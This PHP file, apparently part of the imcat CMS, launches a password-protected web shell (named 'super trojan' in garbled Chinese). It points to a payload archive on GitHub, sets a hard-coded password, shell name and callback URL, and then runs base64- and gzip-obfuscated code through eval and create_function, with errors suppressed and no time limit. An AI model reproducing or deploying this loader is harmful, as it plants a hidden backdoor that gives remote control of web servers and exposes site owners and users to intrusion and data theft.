<?php
ini_set("default_charset", "gbk");
$_cbase['run']['outer'] = 1;
require dirname(__FILE__).'/_config.php';

/**-/ //- eval�Ƿ����?
    #require // helper.php:�������� 
    basEnv::runConst();
    basEnv::runCbase();
    $xmsg = '`ľ����`�޷����� : ��Ҫeval֧��';
    glbError::show(comConvert::autoCSet($xmsg));
//*/

$_locfp = '/ximp/files/supper_muma.imp_php';
if(!is_file(DIR_STATIC.$_locfp)){
    $_dowurl = 'https://github.com/peacexie/imcat/raw/patches/excode/imp_files.rar';
    die("Please down the file `$_locfp` <br>\nfrom `$_dowurl`<br>\n");
}

$password = '@8Y!IyQ`0b_H4-xt'; // xx123##@@
$shellname = 'ľ����-�Ϸ����ã�'; //xx��˾ר��
$myurl = 'http://txjia.com';
$ma_cfgs = "\$password='$password';\$shellname='$shellname';\$myurl='$myurl';";
$ma_code = require DIR_STATIC.$_locfp; 
@$ma_code = $ma_cfgs.eval(gzuncompress(base64_decode($ma_code)));

error_reporting(E_ERROR | E_PARSE);
@set_time_limit(0);
header("content-Type: text/html; charset=gb2312");
$ma_run = create_function('', $ma_code);
$ma_run();
